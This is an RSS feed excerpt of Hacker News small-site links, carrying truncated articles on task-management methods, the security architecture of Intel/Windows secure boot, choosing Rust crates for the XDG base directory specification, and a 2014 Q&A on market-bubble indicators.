Software</a></li><li><a href="#how-doit-io-can-help-you-manage-all-the-tasks-at-work-school-and-home">How Doit.io can help you</a></li></ol><h2 id="what-is-task-management">What is Task Management?</h2><p>All tasks have a life cycle of sorts. Task management is the process of taking a task through that entire cycle from beginning to completion. It involves aspects such as planning, assigning, tracking, delivering, and reporting.</p><!--kg-card-begin: markdown--><blockquote>
<p><span>Task management is the process of taking a task through that entire cycle from beginning to completion.</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>The goal of task management is to ensure that the projects associated with the tasks are completed within the specified deadline. Task management is useful within work teams, families, or for those flying solo.</p><h2 id="5-essential-skills-for-effective-task-management">5 Essential Skills for Effective Task Management</h2><p>Not all taskmasters are created equal. Some lucky folks are born with a natural gift for managing tasks that make them especially effective. The rest of us can improve our task management results by working on the skills that are essential to the process.</p><p>Here are five skills that are considered essential for masterful task management.</p><ol><li><strong>Prioritization:</strong> Recognizing which tasks need urgent attention and which tasks can be put off until later is a key skill for task management.</li><li><strong>Flexibility:</strong> This skill goes hand in hand with prioritization. Things are going to come up that change the direction of any given project. Those who can successfully shift things around without a big fuss are going to be more effective than those who struggle with rigidity.</li><li><strong>Scheduling:</strong> The best task managers are those that can see the big picture of the end goal or project and schedule tasks in accordance with the larger timeline. Oftentimes this requires us to do a task that may not be a favorite, but is a necessary task to move things forward.</li><li><strong>Communication:</strong> This skill is found on the key skills list of everything from long term personal relationships to leadership. Task management is no different. Open, clear, and constant communication about the tasks at hand and to come is absolutely essential to successful task management.</li><li><strong>Delegation:</strong> Task management is not about shouldering the entire load alone. The best task managers are those that can identify who is best suited to which tasks so that progress is made in the most effective manner possible. Sometimes you will be best suited to the task. Other times, assigning tasks to others leads to much better outcomes.<br></li></ol><h2 id="methods-to-use-for-task-management">Methods to Use for Task Management </h2><p>The body of work around task management is vast. It‚Äôs such an important process that there have been countless books, coaching sessions, articles, and methods created around making it more effective. </p><!--kg-card-begin: markdown--><blockquote>
<p><span>Task management can help you stay on track, focus your efforts, and stop missing deadlines, big and small.</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>We have identified a few methods that are especially worth consideration. They are actionable strategies that can be implemented as-is or tweaked to fit your personal preferences. Let‚Äôs take a look at some specific methods for task management.</p><h3 id="eat-that-frog">Eat That Frog</h3><p>This method has a silly name but it gets seriously impressive results! The moniker comes from an oft-cited alleged quote from Mark Twain. He is quoted to have said, ‚ÄúIf it‚Äôs your job to eat a frog, it‚Äôs best to do it first thing in the morning. And if it‚Äôs your job to eat two frogs, it‚Äôs best to eat the biggest one first.‚Äù Esteemed <a href="https://www.briantracy.com/">author and productivity expert Brian Tracy</a> ran with this evocative quote and turned it into a task management method and book by the same name.</p><!--kg-card-begin: markdown--><blockquote>
<p><span>If it‚Äôs your job to eat a frog, it‚Äôs best to do it first thing in the morning. And if it‚Äôs your job to eat two frogs, it‚Äôs best to eat the biggest one first.</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>The main idea with the <a href="https://blog.doit.io/eat-that-frog/">Eat That Frog method</a> is that you should jump right into hard, important, and difficult to deal with tasks first. Once they are done you can move on to other tasks that are easier to swallow, if you will. It is beautiful in its simplicity. It works because it aligns your focus, helps you prioritize, and urges you to take action. </p><h3 id="the-ivy-lee-method">The Ivy Lee Method</h3><p>This task management method is also rooted in a <a href="https://www.businessinsider.com/ivy-lee-method-productivity-2018-9">historical account of folkloric proportions</a>. As the story goes, a man by the name of Charles Schwab (yes, <em>that</em> Charles Schwab) wanted to help his employees increase their productivity. He hired a consultant called Ivy Lee who promised to teach his employees a sure-fire method for improved productivity in just a few minutes. </p><p>Better still, Schwab would pay absolutely nothing up front. Lee asked that the employees use the method for a period of three months and then Schwab should pay Lee what he felt the method was worth. Ivy Lee was paid $25,000 way back in 1918 which is worth over $450,000 in today‚Äôs dollar.</p><!--kg-card-begin: markdown--><blockquote>
<p><span>The key to meeting deadlines and staying on track to complete projects is effective task management.</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>The secret is out and now we all have access to the <a href="https://blog.doit.io/the-ivy-lee-method/">Ivy Lee Method</a>. It goes like this. Every day at the conclusion of your work day, spend a mere ten minutes thinking about what you have to accomplish tomorrow. Write down the six most important tasks and order them by priority. When you start work the next day, start with the most important task and work your way down one task at a time. Whatever is left undone should be included in the next day‚Äôs list. That‚Äôs it. </p><h3 id="get-things-done-or-gtd">Get Things Done or GTD</h3><p>This method comes from author David Allen whose book on the process remains popular since it‚Äôs publication nearly 20 years ago. It stands the test of time because it is fairly simple to implement and it actually works. The basic assumption is that our minds are cluttered with a flurry of things we need to remember or that we want to accomplish. If we can get those thoughts out of our heads and onto paper, our minds will be cleared and we can get things done.</p><p>GTD has five steps that we have<a href="https://blog.doit.io/getting-things-done-gtd-method/"> explained in greater detail</a> in a separate article. They are:</p><ol><li><strong>Capture:</strong> Dump all ideas, thoughts, ideas, tasks out of your mind and into the space or place of your choosing.</li><li><strong>Clarify:</strong> Go through the list and eliminate anything that is not actionable. From what is left, see if any tasks can be broken down into smaller tasks.</li><li><strong>Organize</strong>: At this stage, you take each task and prioritize it against the others.</li><li><strong>Reflect:</strong> The list must be reflected upon regularly as circumstances and priorities change. Make adjustments as needed.</li><li><strong>Engage:</strong> Get going! Start taking action and get things done, one by one.<br></li></ol><h3 id="the-eisenhower-matrix">The Eisenhower Matrix</h3><p>This method is aimed specifically at prioritization. It comes from the legendary productivity of former U.S. president, five-star army general, and all-around amazing accomplisher Dwight Eisenhower. The method was made popular by its inclusion in Stephen Covey‚Äôs perennial bestseller <a href="https://www.amazon.com/Habits-Highly-Effective-People-Powerful/dp/0743269519">The Seven Habits of Highly Effective People</a>.</p><!--kg-card-begin: markdown--><blockquote>
<p><span>Recognizing which tasks need urgent attention and which tasks can be put off until later is a key skill for task management.</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>The core idea of the Eisenhower Matrix is determining whether or not a particular task is important, urgent, both, or neither. Importance and urgency are not the same thing. A task is important only if it moveImportance refers to how much a task moves us forward in achieving a long-term goal or mission. Urgency refers to how quickly something has to get done or how ‚Äúin the moment‚Äù it is. Urgency doesn‚Äôt always equal importance.</p><p>Tasks that are both urgent and important must be assigned the highest priority. Tasks that are urgent but not important should be delegated to someone else. Those that are important but not urgent should be planned. And those that are neither should be eliminated all together. For more <a href="https://blog.doit.io/the-eisenhower-matrix/">in-depth information on the Eisenhower Matrix</a>, check out our previous exploration of the method. </p><h2 id="why-should-you-use-task-management-software">Why Should You Use Task Management Software</h2><p>Based on the methods we have recommended and the skills we have identified as necessary to improve management of tasks you may be thinking that all you really need to become a taskmaster is a pen and paper. That would be true if you lived and worked completely on your own.</p><p>The reality is that our tasks are often commingled with the tasks of others. It is true in work teams, in classrooms, and in households all over the world. Collaboration is a regular part of our professional and personal lives. Task management software can make collaboration with others so much easier and tasks will be better managed, too.</p><p>Task management software allows you to implement all of the necessary components to the task management process more efficiently and effectively. Specifically, task management software improves visibility, access, communication, and collaboration. </p><ul><li>Visibility among all people involved in a particular project is improved. Everyone can see who is supposed to be doing what.</li><li>Access to tasks is instant and always available in the palm of your hand.</li><li>Easily delegate and communicate with others involved in the task or project.</li><li>Track and report progress to identify critical need areas and keep things moving.</li></ul><h2 id="key-features-of-the-best-task-management-software">Key Features of the Best Task Management Software</h2><p>If you decide to incorporate a task ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.doit.io/task-management/">https://blog.doit.io/task-management/</a></em></p>]]>
            </description>
            <link>https://blog.doit.io/task-management/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26140123</guid>
            <pubDate>Mon, 15 Feb 2021 07:35:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Security features of the Intel/Windows platform secure boot process]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26140122">thread link</a>) | @ingve
<br/>
February 14, 2021 | https://igor-blue.github.io/2021/02/04/secure-boot.html | <a href="https://web.archive.org/web/*/https://igor-blue.github.io/2021/02/04/secure-boot.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
        
        <ul id="markdown-toc">
  <li><a href="#introduction-and-system-architecture" id="markdown-toc-introduction-and-system-architecture">Introduction and System Architecture</a>    <ul>
      <li><a href="#buses" id="markdown-toc-buses">Buses</a></li>
      <li><a href="#more-components" id="markdown-toc-more-components">More Components</a></li>
      <li><a href="#the-flash-chip" id="markdown-toc-the-flash-chip">The Flash Chip</a></li>
    </ul>
  </li>
  <li><a href="#overview" id="markdown-toc-overview">Overview</a></li>
  <li><a href="#early-power-on" id="markdown-toc-early-power-on">Early power on</a></li>
  <li><a href="#bring-up-bup" id="markdown-toc-bring-up-bup">Bring-Up (BUP)</a></li>
  <li><a href="#cpu-initialization" id="markdown-toc-cpu-initialization">CPU initialization</a></li>
  <li><a href="#uefi-initialization" id="markdown-toc-uefi-initialization">UEFI initialization</a>    <ul>
      <li><a href="#loading-the-boot-loader" id="markdown-toc-loading-the-boot-loader">Loading the boot loader</a></li>
    </ul>
  </li>
  <li><a href="#windows-boot" id="markdown-toc-windows-boot">Windows Boot</a>    <ul>
      <li><a href="#winload" id="markdown-toc-winload">Winload</a></li>
      <li><a href="#hvci" id="markdown-toc-hvci">HVCI</a></li>
      <li><a href="#dynamic-root-of-trust-model-drtm" id="markdown-toc-dynamic-root-of-trust-model-drtm">Dynamic Root of Trust Model (DRTM)</a></li>
      <li><a href="#uefi-memory-attributes-table" id="markdown-toc-uefi-memory-attributes-table">UEFI Memory Attributes Table</a></li>
    </ul>
  </li>
  <li><a href="#other-oss" id="markdown-toc-other-oss">Other OSs</a></li>
  <li><a href="#more-protections" id="markdown-toc-more-protections">More Protections</a>    <ul>
      <li><a href="#iommu-and-dma-protections" id="markdown-toc-iommu-and-dma-protections">IOMMU and DMA protections</a></li>
      <li><a href="#secure-devices" id="markdown-toc-secure-devices">Secure Devices</a></li>
      <li><a href="#smm" id="markdown-toc-smm">SMM</a></li>
      <li><a href="#memory-reset-protections" id="markdown-toc-memory-reset-protections">Memory Reset protections</a></li>
    </ul>
  </li>
</ul>

<p>This blog post is an in-depth dive into the security features of the Intel/Windows platform boot process. In this post I'll explain the startup process through security focused lenses, next post we'll dive into several known attacks and how they were handled by Intel and Microsoft. My wish is to explain to technology professionals not deep into platform security why Microsoft's SecureCore is so important and necessary.</p>



<p>We must first begin with a brief introduction to the hardware platform. Skip this if you have read the awsome material available on the web about the Intel architecture, I'll try to briefly summarize it here.</p>

<p>The Intel platform is based on one or two chips. Small systems have one, the desktop and server ones are separated to a CPU complex and a PCH complex (PCH = Platform Controller Hub).</p>

<p><img src="https://igor-blue.github.io/images/image2020-4-19_14-3-0.png" alt="Intel architecture"></p>

<p>The CPU complex deals with computation. It holds the "processor" cores, e.g. Sunny Cove that implement the ISA, as well as cross core caches like the L3 cache, and more controllers that are grouped together as "the system agent" or the "uncore". The uncore contains the memory controller and display, e.g. GPU and display controller.</p>

<p>The PCH handles all other IO, including access to the firmware through SPI or eSPI, wifi, LAN, USB, HD audio, SMBus, thunderbolt and etc'. The PCH also hosts several embedded processors, like the PMC, the Power Management Controller.</p>

<p>An additional part of the PCH is a very important player in our story, the CSME, or Converged Security &amp; Management Engine, a i486 IP block (also called Minute IA). CSME is responsibly for much of the security model of Intel processors as well as many of the manageability features of the platform. The CSME block has its own dedicated ~1.5mb of SRAM memory and 128KB of ROM, as well as a dedicated IOMMU, called the A-Unit (that even has its own <em>acode</em> microcode) located in the CSME's <em>uncore</em>', thats allows access from ME to the main memory, as well as DMA to/from the main memory and using the main memory as an encrypted paging area ("virtual memory"). The CSME engine runs a customized version of the Minix3 microkernel, also recent versions have changed it beyond recognition adding many security features.</p>

<p><img src="https://igor-blue.github.io/images/image2020-4-19_14-14-4.png" alt="CSME structure"></p>

<h2 id="buses">Buses</h2>
<p>Lets use this post to also introduce the main interconnects in the system. The main externally facing interconnect bus is PCI-E, a fast bust that can reach 64GBps in its latest incarnations. A second external bus is the LPC, or Low Pin Count bus, a slow bus for connecting devices such as SPI flash, the TPM (explained below), and old peripherals such as PS/2 touchpads.</p>

<p>Internally the platform is based around the <strong>IOSF</strong>, or Intel On-chip System Fabric, which is a pumped up version of PCI-E that supports many additional security and addressing features. For addressing IOSF adds SourceID and DestID fields that contain the source and destination of any IOSF transaction, extending PCI-E Bus-Device-Function (BDF) addressing to enable routing over bridges. IOSF also extends addressing by adding support for multiple address root namespaces, currently defining three: RS0 for host memory space, RS1 for CSME memory space, and RS2 for the Innovation-Engine (IE), another embedded controller currently present only on server chipsets.
There are two IOSF busses in the PCH - the Primary Fabric and the Sideband Fabric. The Primary Fabric is high speed, connecting the CPU to the PCH (through a protocol call DMI), as well as high speed devices such as Gigbait Ethernet, WiFi and eSPI. The Sideband Fabric is used to connect the CSME to low-speed devices, including the PMC (Power Management Controller), the RNG generator, GPIO pins, USB, SMBus, and even debugging interfaces such as JTAG.</p>

<h2 id="more-components">More Components</h2>
<p>Another interesting component is the <strong>ITH</strong>, or Intel Trace Hub, which is codenamed North Peak (NPK). The ITH can trace different internal hardware component (VIA - Visualization of Internal Signals, ODLA - On-chip logic analyzer, SoCHAP - SOC performance counters, IPT - Intel Process Trace, AET - Intel Architecture Trace), and external component like CSME, the UEFI firmware, and you can even connect it to ETW. This telemetry eventually finds its way to Intel in various methods.</p>

<p><img src="https://igor-blue.github.io/images/image2020-4-22_0-52-2.png" alt="Intel Trace Hub"></p>

<p>The <strong>TPM</strong> is designed to provide a tamper proof environment to enforce system security through hardware. It implements in hardware many essential functions: sha1 &amp; sha256 hashing algorithms, many crypto and key derivation functions, measurment registers call the Platform Configuration Registers (PCRs), a secret key - Endorsment Key - used to derive all other keys, and non-volatile storage slots for storing keys and hashes. Discrete TPM chips (i.e. those that are a separate chip on the mainboard or SOC and connected through the LPC) are call dTPMs, or can be implemented in the CSME module's firmware and called fTPMs.</p>

<p>The TPM's <strong>PCR</strong> are initialized to zero when the platform boots and are filled up with measurements through the boot process. PCRs 0-15 are intended for "static" use - they reset when the platform boots; They are supposed to give the OS loader a view of the platform initialization state.
PCRs 17-22 are for "dynamic" use - they get reset on each secure launch (GETSEC[SENTER]); They are supposed to be used by the attestation sofware that checks if the OS is trusted.</p>

<h2 id="the-flash-chip">The Flash Chip</h2>
<p>SPI flash has 5 major regions: the Descriptor regions, the CSME region, the Gigabit Ethernet Region, the Platform Data Region, and the UEFI region. In the image below you can see an example of how the flash is organized.</p>

<p><img src="https://igor-blue.github.io/images/image2019-11-11_1-18-53_1.png" alt="Partition regions in SPI flash">
<img src="https://igor-blue.github.io/images/image2019-11-11_1-19-12.png" alt="Serial flash sizes"></p>

<p>Later versions added more regions:</p>

<p><img src="https://igor-blue.github.io/images/image2019-11-25_22-49-41.png" alt="SPI region evolution"></p>

<p>These regions are categorized as fault tolerant (FTPs) and non fault tolerant partitions (NFTPs).
Fault tolerant partitions are critical for boot, and verified during early boot (like the RBE, the CSME ROM Boot extensions will discuss in a few paragraphs). If verification fails - the system does not boot. Examples of non fault tolerant partitions are the Integrated Sensor Hub (or ISH) firmware.</p>

<p>SPI flash protection is applied at multiple levels: On the flash chip itself, in the SPI flash controller (in the PCH), in UEFI code and in CSME code.</p>

<p>The SPI controller maps the entire flash to memory at a fixed address, so reads/writes are usually done simply by reading/writing memory. The SPI controller translates this to flash-specific commands issued on the SPI bus, using a table of flash-specific commands stored in the flash descriptor region.
This is called "Hardware Sequencing", meaning the SPI controller issues the actual SPI commands
When hardware sequencing is in use, the SPI controller enforces several flash protections based on the masters region table in the flash (but can be overriden using a hardware PIN).</p>

<p>The SPI controller also implements a FLOCKDN flag. FLOCKDN is a write-once bit that, when set, disables use of software sequencing and modification of the PR registers until the next reset. The CSME sets this in the Bring-UP process (bup_storage_lock_spi_configuration(), see below). This happens when the UEFI notifies it that it is at the end of POST. In addition to the region access control table, the SPI controller also has an option to globally protect up to five regions in the flash from write access by the host using five registers, called Protected Registers (PRs), which are intended for the UEFI firmware to protect itself from modification while the OS is running.</p>

<p>It is also possible to issue direct flash commands using "Software Sequencing" by writing to the OPTYPE/OPMENU registers, since this can be used circumvent the SPI-enforced protections, software sequencing is usually disabled after POST using the FLOCKDN bit.</p>

<p>How is the flash updated?</p>

<p>UEFI region is updated through an UEFI capsule, This update happens during POST, before PRs and FLOCKDN is set, therefore, the BIOS region is still accessible to UEFI code.</p>

<p>Many OEMS have then own UEFI anti-tamper protections. For example, HP has SureStart on laptops and workstations, and Dell has TrustedDevice SafeBIOS. SafeBIOS copies bad firmware images to the EFI system partition, and the Dell Trusted Device software on Windows sends their hashes plus the hash of the UEFI firmware currently in memory to a Dell cloud server (*.delltrusteddevicesecurity.com) to check against a list of "authorized" hashes. Server platforms have similiar protections, including iLO for HP and iDRAC in Dell.
The CSME region can usually be updated only from within the CSME. However, for more complicated upgrades CSME can temporarily unlock the ME region for host read &amp; write.</p>


<p>In the next sections we'll look over all the stages of boot.
<img src="https://igor-blue.github.io/images/image2020-4-20_14-56-23.png" alt="Serial flash sizes"></p>


<p>Boot starts the PMC, the Power Management Controller.
In modern Intel systems the PMC is an ARC core and its the first controller to execute code once electricity is applied to the system. We'll talk more about PMC in a later post as its quiet interesting and has its own microcode and firmware, and event generates telemetry over the IOSF SB bus (which we'll talk about in a moment).</p>

<p>While the PMC does its init, the rest of the system is held at bay at a RESET state.</p>

<p>The next part to start running is the CSME. Recall from the first post in the series, CSME, or Converged Security and Managment Engine is a MinuteIA (i486 CPU IP block) embedded in the Platform Controller Hub (PCH).
The CSME begins running from its own embedded 128KB ROM - the CSME-ROM. This ROM is protected with a hardware fuse that is burned by Intel during production.
When started the CSME ROM starts like a regular 486 processor BIOS - in the reset vector in real mode. Its first order of business is to ‚Ä¶</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://igor-blue.github.io/2021/02/04/secure-boot.html">https://igor-blue.github.io/2021/02/04/secure-boot.html</a></em></p>]]>
            </description>
            <link>https://igor-blue.github.io/2021/02/04/secure-boot.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26140122</guid>
            <pubDate>Mon, 15 Feb 2021 07:34:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The XDG base directory specification and Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26139821">thread link</a>) | @pabs3
<br/>
February 14, 2021 | https://blog.liw.fi/posts/2021/02/14/xdg-base-dirs-rust/ | <a href="https://web.archive.org/web/*/https://blog.liw.fi/posts/2021/02/14/xdg-base-dirs-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article class="page">
    

    

    <div id="pagebody">
      <section>
	<p>Edited to clarify <code>XDG_RUNTIME_DIR</code> based on feedback from smcv.</p>
<p>The <a href="https://specifications.freedesktop.org/basedir-spec/basedir-spec-latest.html">XDG base directory</a> specification exists to address the problem of where programs should look for various kinds of files on a Unix system. Traditionally, in Unix, a per-program, per-user configuration file is stored as a ‚Äúdot file‚Äù: program <code>foo</code> would expect to find a file such as <code>$HOME/.foorc</code> at startup, and if it doesn‚Äôt exist, read <code>/etc/foorc</code>. Or possibly both, and possibly more. This has led the home directories of Unix users to have tens, even hundreds of configuration files. Mine has currently 83 such files, but I pruned it brutally before the holidays. The specification specifies ways in which this mess can be reduced, as long as programs follow it.</p>
<p>The specification deals with four types of files:</p>
<ul>
<li>configuration files</li>
<li>data files</li>
<li>files with cached data</li>
<li>small files needed at run time for interprocess communication</li>
</ul>
<p><strong>Configuration files</strong> affect how a program does things. The specification assumes a model where a user can override per-system defaults, and those can override defaults shipped with the program, and those in turn can override built-in, hardcoded defaults. Thus, configuration files need to be looked up in a number of places.</p>
<p><strong>Data files</strong> are files that the program needs or creates. Typically, these would be data such as icons, templates, and game levels, supplied with the program, but can also be things such as cookies saved by a web browser. Documents that the user creates using the program would typically be data files in this context.</p>
<p><strong>Cache data</strong> is meant to be not important. Ideally, the user can delete them at any time without anything breaking.</p>
<p><strong>Runtime files</strong> for interprocess communication includes things like the sockets for the GnuPG command line tool and the GPG agent to communicate. They‚Äôre meant to exist only while the user is logged in, and should not take much disk space.</p>
<p>There are many other kinds of files, of course, but this is what‚Äôs in scope of the specification.</p>

<p>For all directories, the specification provides defaults and a way to override the default using an environment variable.</p>
<p>For all four types of files, there is a single directory where the program can write files of that type. For configuration and data files, there is also a list of fallback directories where it can look up files not found in its single directory.</p>
<table>
<thead>
<tr>
<th>Type of file</th>
<th>Environment variable</th>
<th>Default</th>
</tr>
</thead>
<tbody>
<tr>
<td>configuration</td>
<td><code>XDG_CONFIG_HOME</code></td>
<td><code>$HOME/.config</code></td>
</tr>
<tr>
<td>data</td>
<td><code>XDG_DATA_HOME</code></td>
<td><code>$HOME/.local/share</code></td>
</tr>
<tr>
<td>cached data</td>
<td><code>XDG_CACHE_HOME</code></td>
<td><code>$HOME/.cache</code></td>
</tr>
<tr>
<td>runtime file</td>
<td><code>XDG_RUNTIME_DIR</code></td>
<td>no default</td>
</tr>
<tr>
<td>fallback config</td>
<td><code>XDG_CONFIG_DIRS</code></td>
<td><code>/etc/xdg</code></td>
</tr>
<tr>
<td>fallback data</td>
<td><code>XDG_DATA_DIRS</code></td>
<td><code>/usr/local/share/:/usr/share/</code></td>
</tr>
</tbody>
</table>
<p>The usual value for <code>XDG_RUNTIME_DIR</code> is <code>/run/user/$UID</code>. The spec says that if it isn‚Äôt set, there is no default. Some software falls back to <code>~/.cache</code> with a warning to the user, other software disables any features that requires the runtime directory.</p>
<p>is the current customary location for Linux. It‚Äôs not specified by the XDG base directory specification.</p>
<p>If any of the environment variables contains a directory that is not an absolute path name, that value should be ignored.</p>
<p>For each directory, the specification gives a base directory. Each program should put its files in a subdirectory of the base directory: program foo should use <code>$XDG_CONFIG_DATA/foo</code> for example.</p>

<p>The problem of finding files of various kinds exists across operating systems. A portable program should use an abstraction that is implemented in the correct way for each platform. The XDG specification is specific to Unix, but the <em>concepts</em> are portable.</p>
<p>I lack experience with Windows and Macintosh systems to give details of what the correct places for each type of file are on those systems. However, in my quest to find a library to implement XDG for my own use, on Unix, I might as well look for something that supports other platforms as well.</p>

<p>The freedesktop.org project also defines a way to specify where certain kinds of user data goes: documents, pictures, music, etc. This is known as the <a href="https://www.freedesktop.org/wiki/Software/xdg-user-dirs/">xdg-user-dirs</a> specification. Again, this is for Unix, and desktop software on free Unix systems, but the concepts are intentionally portable to other systems. This is also an important specification, but not relevant to me at this time.</p>

<p>For a software project written in Rust that I work on with a friend, we want to support the XDG base directory specification and we would like to support it well. The specification is not very difficult to implement, but we would prefer to use an existing crate, and there are many options. This blog post is a brief evaluation of the options I found.</p>
<p>I searched <a href="https://crates.io/search?q=xdg">https://crates.io/search?q=xdg</a> to find candidates. There‚Äôs a lot of crates for this. However, some seem to be empty placeholders, which I‚Äôm not even listing.</p>
<ul>
<li><a href="https://crates.io/crates/cap-directories">cap-directories</a></li>
<li><a href="https://crates.io/crates/directories">directories</a></li>
<li><a href="https://crates.io/crates/directories-next">directories-next</a></li>
<li><a href="https://crates.io/crates/dirs">dirs</a></li>
<li><a href="https://crates.io/crates/dirs2">dir2</a></li>
<li><a href="https://crates.io/crates/dirs-2">dirs-2</a></li>
<li><a href="https://crates.io/crates/dirs-next">dirs-next</a></li>
<li><a href="https://crates.io/crates/platform-dirs">platform-dirs</a></li>
<li><a href="https://crates.io/crates/xdg">xdg</a>
<ul>
<li>only for Unix</li>
</ul></li>
<li><a href="https://crates.io/crates/xdg-basedir">xdg-basedir</a>
<ul>
<li>only for Unix</li>
</ul></li>
<li><a href="https://crates.io/crates/xdg-user-macros">xdg-user-macros</a>
<ul>
<li>only for Unix</li>
</ul></li>
</ul>
<p>Of these, I‚Äôm dropping the ones that are only for Unix. The various variants of ‚Äúdirs‚Äù are a low-level library, and used by the ‚Äúdirectories‚Äù variants, so I‚Äôll concentrate on the higher level ones. Of those, the ‚Äúdirectories-next‚Äù create seems newer than the ‚Äúdirectories‚Äù one, so I"ll prefer that one. This leaves three:</p>
<ul>
<li><a href="https://crates.io/crates/cap-directories">cap-directories</a></li>
<li><a href="https://crates.io/crates/directories-next">directories-next</a></li>
<li><a href="https://crates.io/crates/platform-dirs">platform-dirs</a></li>
</ul>

<p>I‚Äôm going to evaluate the crates using the following approach: I‚Äôll write a small program that uses the crate and writes out the paths to the four data directories. I‚Äôll then run it with the environment variables set to various values and check that the results are as expected.</p>
<ul>
<li><p>Check defaults: run without any <code>XDG_</code> variables set in the environment; expect the following results (my home directory is <code>/home/liw</code> and my UID is 1000):</p>
<ul>
<li>config: <code>/home/liw/.config</code></li>
<li>config dirs: <code>/etc/xdg</code></li>
<li>data: <code>/home/liw/.local/share</code></li>
<li>data dirs: <code>/usr/local/share/:/usr/share/</code></li>
<li>cache: <code>/home/liw/.cache</code></li>
<li>runtime: <code>/run/user/1000</code></li>
</ul></li>
<li><p>Set each environment variable to an empty value and check that the output has the default value.</p></li>
<li><p>Set each environment variable to a special value and check that the output has that value.</p></li>
<li><p>Set each variable to a value that is not an absolute, and check that the output has the default value.</p></li>
</ul>

<h2 id="cap-directories">cap-directories</h2>
<p>This crate doesn‚Äôt seem to provide path names, only structs that represent the corresponding ‚Äúopen directory‚Äù. This may be a better abstraction for some use cases, but seems overkill for others, and constricting. How would a program tell the user at what path it expects a configuration file, for example?</p>
<h2 id="platform-dirs">platform-dirs</h2>
<p>The documentation is not as clear as it could be, but I got things working, so I guess it‚Äôs good enough.</p>
<p>This crate has a ‚Äústate directory‚Äù, but not a ‚Äúruntime directory‚Äù and doesn‚Äôt seem to have that at all. In fact, the README says it‚Äôs been removed. This disqualifies it from my/our use, I think.</p>
<h2 id="directories-next">directories-next</h2>
<p>This seems quite straightforward. Documentation is OK.</p>
<p>This crate insists that <code>XDG_RUNTIME_DIR</code> is set and does not have a default. I can live with that, even if it‚Äôs not great.</p>

<p>Of the three crates I looked at, <code>directories-next</code> is the clear winner.</p>

<p>The source code I wrote, what there is of it, is at <a href="https://gitlab.com/larswirzenius/xdg-experiments/">https://gitlab.com/larswirzenius/xdg-experiments/</a>.</p>

      </section>
    </div>

    
  </article></div>]]>
            </description>
            <link>https://blog.liw.fi/posts/2021/02/14/xdg-base-dirs-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26139821</guid>
            <pubDate>Mon, 15 Feb 2021 06:42:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top Indicators of a Market Bubble (2014)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26139808">thread link</a>) | @anm89
<br/>
February 14, 2021 | https://www.henssler.com/top-indicators-of-a-market-bubble/ | <a href="https://web.archive.org/web/*/https://www.henssler.com/top-indicators-of-a-market-bubble/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><span><a href="https://www.henssler.com/storage/radio/051814-investment.mp3"><img src="https://www.henssler.com/wp-content/uploads/2019/03/listenbtn.png?__SQUARESPACE_CACHEVERSION=1310433640184" alt="Top Indicators of a Market Bubble 1" title="Top Indicators of a Market Bubble 1"></a></span></span><span><span><a href="https://itunes.apple.com/us/podcast/money-talks-radio-show-atlanta/id286345195" rel="noopener"><img src="https://www.henssler.com/wp-content/uploads/2019/03/itunes.png?__SQUARESPACE_CACHEVERSION=1309017511163" alt="Top Indicators of a Market Bubble 2" title="Top Indicators of a Market Bubble 2"></a></span></span></p>

<p><strong>Question:</strong></p>
<p>What are the signs of a market bubble? I hear market pundits yammering about the next big bubble and while I‚Äôm not trying to time the market, I don‚Äôt want my small-cap holdings swept up in a big burst.</p>
<p><strong>Answer</strong>:</p>
<p>At Henssler Financial, we believe the key sign of a market bubble is when investors are coming up with different rationales or metrics to value a stock. For example, if earnings are not good, investors will look to obscure metrics like potential cash flow, number of users or potential price-to-earnings in 2025. If a company does not have earnings, it is of no value to us. One of the biggest bubbles we see is Amazon.com (NASDAQ: AMZN) because the company is able to keep increasing its sales; however, it is not making any money.</p>
<p>Companies most prone to bubbles are those with rapid sales growth. While a new company may reinvest revenues into company growth, eventually that has to stop and the company has to make money. During bubbles, low quality companies will often have large P/E ratios.</p>
<p>Bubbles also happen when the market is priced irrationally. In 2000, the entire market was trading at 30 times earnings. The Technology sector was trading nearly 73 times earnings, while some individual stocks in Technology were trading at 100 times earnings. The current market P/E is 16.5, which is in line with the long-term average. When a market starts trading at 30 times earnings, it is time to be concerned.</p>
<p>There is also a difference between being overvalued and a bubble. The stock market will always go up and down. It‚Äôs no secret stocks are more expensive today than they were a year ago. However, investors still need to invest money today. An investor needs to compare the relative valuation of stocks to other assets. The market may not be cheap, but it may be the best place to be long term. A 10-year U.S. Treasury yields 2.49%. You can get a high-quality stock that pays more than that in dividends and has the potential to increase in value.</p>
<p>We think the current market is fairly priced. At Henssler Financial we believe you should Live Ready, and that includes understanding the signs in the market. &nbsp;If you have questions regarding your investments, the experts at Henssler Financial will be glad to help. You may call us at 770-429-9166 or email at <a href="mailto:experts@henssler.com">experts@henssler.com</a>.</p>
<h5>Disclosures</h5>
